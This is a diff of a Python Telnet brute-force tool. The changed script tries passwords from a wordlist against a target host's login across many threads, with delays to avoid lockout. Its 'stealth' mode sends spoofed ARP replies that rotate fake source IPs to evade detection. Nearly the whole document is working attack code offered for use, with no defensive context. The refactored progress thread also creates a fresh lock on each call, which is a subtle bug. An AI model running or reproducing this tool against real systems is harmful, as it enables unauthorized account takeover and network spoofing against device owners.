@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Telnet Brute Force Tool with ARP Spoof Mode
+# Telnet Brute Force
 
 import argparse
 import threading
@@ -17,10 +17,9 @@ GREEN  = "\033[38;2;0;255;0m"
 RESET  = "\033[0m"
 BOLD   = "\033[1m"
 
-stopAttack = False
-stdoutLock = threading.Lock()
-attemptsDone = 0
-startTime = time.time()
+stopAttack    = False
+attemptsDone  = 0
+startTime     = 0
 
 def SignalHandler(sig, frame):
     global stopAttack
@@ -35,9 +34,9 @@ def FormatDuration(seconds):
 
 def PrintProgress(total):
     while not stopAttack:
-        with stdoutLock:
-            duration = FormatDuration(time.time() - startTime)
-            print(f"{RED}Attempts: {attemptsDone}/{total} | Duration: {duration}{RESET}", end="\r")
+        elapsed = time.time() - startTime
+        with threading.Lock():
+            print(f"\r{RED}Attempts: {attemptsDone}/{total} | Duration: {FormatDuration(elapsed)}{RESET}", end="")
         time.sleep(1)
 
 def AttemptLogin(host, port, username, password, sourceIp=None):
@@ -59,26 +58,25 @@ def AttemptLogin(host, port, username, password, sourceIp=None):
         time.sleep(1)
         out = tn.read_very_eager().decode(errors="ignore")
         tn.close()
-        if any(p in out for p in ["#", "$", ">"]):
-            print(f"\n{GREEN}Success: {username}:{password}{RESET}")
-            return True
+        return any(p in out for p in ["#", "$", ">"])
     except:
-        pass
+        return False
     finally:
         sock.close()
-    return False
 
 def ArpSpoofOnce(targetIp, fakeIp, iface):
     pkt = ARP(op=2, pdst=targetIp, psrc=fakeIp, hwdst="ff:ff:ff:ff:ff:ff")
     send(pkt, iface=iface, verbose=False)
 
-def WorkerStealth(host, port, username, passwords, delay):
-    global attemptsDone
+def WorkerNormal(host, port, username, passwords, delay):
+    """Mode 1: simple brute force, no ARP spoof."""
+    global attemptsDone, stopAttack
     failCount = 0
     for pwd in passwords:
         if stopAttack:
             break
         if AttemptLogin(host, port, username, pwd):
+            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
             stopAttack = True
             break
         attemptsDone += 1
@@ -89,39 +87,42 @@ def WorkerStealth(host, port, username, passwords, delay):
             delay = min(delay * 2, 30)
             failCount = 0
 
-def WorkerArp(host, port, username, passwords, subnetPrefix, iface, delay):
-    global attemptsDone
+def WorkerStealth(host, port, username, passwords, subnetPrefix, iface, delay):
+    """Mode 2: stealth using ARP spoof to rotate source IPs."""
+    global attemptsDone, stopAttack
     for pwd in passwords:
         if stopAttack:
             break
-        fakeIp = f"{subnetPrefix}.{random.randint(2, 254)}"
+        fakeIp = f"{subnetPrefix}.{random.randint(2,254)}"
         ArpSpoofOnce(host, fakeIp, iface)
         if AttemptLogin(host, port, username, pwd, sourceIp=fakeIp):
+            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
             stopAttack = True
             break
         attemptsDone += 1
         time.sleep(delay)
 
 def StartAttack(host, port, username, passwords, mode, subnetPrefix, iface, threadsCount, delay):
-    global startTime
+    global startTime, attemptsDone
     startTime = time.time()
-    threads = []
+    attemptsDone = 0
+    total = len(passwords)
+
+    # progress thread
+    prog = threading.Thread(target=PrintProgress, args=(total,), daemon=True)
+    prog.start()
 
     slices = [passwords[i::threadsCount] for i in range(threadsCount)]
-
-    # Progress thread
-    progressThread = threading.Thread(target=PrintProgress, args=(len(passwords),), daemon=True)
-    progressThread.start()
-
+    threads = []
     for i in range(threadsCount):
-        if mode == "arp":
+        if mode == "stealth":
             t = threading.Thread(
-                target=WorkerArp,
+                target=WorkerStealth,
                 args=(host, port, username, slices[i], subnetPrefix, iface, delay)
             )
         else:
             t = threading.Thread(
-                target=WorkerStealth,
+                target=WorkerNormal,
                 args=(host, port, username, slices[i], delay)
             )
         t.start()
@@ -145,24 +146,25 @@ def menu():
         return
     with open(wordlist) as f:
         passwords = [l.strip() for l in f if l.strip()]
-    mode = input(f"{RED}Mode: [1] Stealth [2] ARP spoof: {RESET}").strip()
-    if mode == "2":
+
+    choice = input(f"{RED}Mode: [1] Normal [2] Stealth (ARP spoof): {RESET}").strip()
+    if choice == "2":
         subnetPrefix = input(f"{RED}Subnet prefix (e.g. 192.168.1): {RESET}").strip()
         iface        = input(f"{RED}Interface (e.g. eth0): {RESET}").strip()
-        StartAttack(host, port, username, passwords, "arp", subnetPrefix, iface, threads, delay)
+        StartAttack(host, port, username, passwords, "stealth", subnetPrefix, iface, threads, delay)
     else:
-        StartAttack(host, port, username, passwords, "stealth", None, None, threads, delay)
+        StartAttack(host, port, username, passwords, "normal", None, None, threads, delay)
 
 def terminal():
     parser = argparse.ArgumentParser(description="Telnet Brute Force Tool")
     parser.add_argument("-i","--host",    required=True, help="Target IP")
     parser.add_argument("-P","--port",    type=int, default=23, help="Telnet port")
     parser.add_argument("-u","--username",default="root", help="Login username")
-    parser.add_argument("-m","--mode",    choices=["stealth","arp"], default="stealth", help="Attack mode")
-    parser.add_argument("--subnet",       help="Subnet prefix (e.g. 192.168.1)")
-    parser.add_argument("--iface",        help="Network interface (e.g. eth0)")
+    parser.add_argument("-m","--mode",    choices=["normal","stealth"], default="normal", help="Mode")
+    parser.add_argument("--subnet",       help="Subnet prefix (e.g. 192.168.1) for stealth")
+    parser.add_argument("--iface",        help="Interface (e.g. eth0) for stealth")
     parser.add_argument("-t","--threads", type=int, default=10, help="Number of threads")
-    parser.add_argument("-d","--delay",   type=float, default=1.0, help="Delay between attempts (seconds)")
+    parser.add_argument("-d","--delay",   type=float, default=1.0, help="Delay between attempts (s)")
     args = parser.parse_args()
 
     wordlist = os.path.join(os.path.dirname(__file__), "passwords.txt")
